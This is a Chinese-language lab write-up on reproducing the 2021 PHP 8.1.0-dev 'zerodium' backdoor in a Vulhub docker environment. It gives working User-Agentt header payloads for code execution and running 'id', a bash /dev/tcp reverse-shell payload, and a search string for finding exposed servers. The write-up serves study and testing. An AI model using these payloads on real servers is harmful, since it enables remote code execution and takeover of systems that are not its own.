# PHP 8.1.0-dev 开发版本 zerodium 后门漏洞

## 漏洞描述

PHP 8.1.0-dev 版本在 2021 年 3 月 28 日被植入后门，但是后门很快被发现并清除。当服务器存在该后门时，攻击者可以通过发送 User-Agentt 头来执行任意代码。

参考链接：

- https://news-web.php.net/php.internals/113838
- https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
- https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a

## 漏洞影响

```
PHP 8.1.0-dev
```

## 网络测绘

```
"PHP/8.1.0-dev"
```

## 环境搭建

Vulhub 执行如下命令启动一个存在后门的 PHP 8.1 服务器：

```
docker compose up -d
```

环境启动后，服务运行在 `http://your-ip:8080`。

## 漏洞复现

添加请求头，注意是 **User-Agentt** 不是 User-Agent。

执行代码：

```
User-Agentt: zerodiumvar_dump(233*233);
```

![](images/PHP%208.1.0-dev%20开发版本%20zerodium%20后门漏洞/image-20240529084958596.png)

执行命令：

```plain
User-Agentt: zerodiumsystem("id");
```

![](images/PHP%208.1.0-dev%20开发版本%20zerodium%20后门漏洞/image-20240529085013250.png)

反弹 shell：

```
User-Agentt: zerodiumsystem("bash -c 'exec bash -i &> /dev/tcp/<your-ip>/<port> <& 1'");
```

![](images/PHP%208.1.0-dev%20开发版本%20zerodium%20后门漏洞/image-20240529085117047.png)
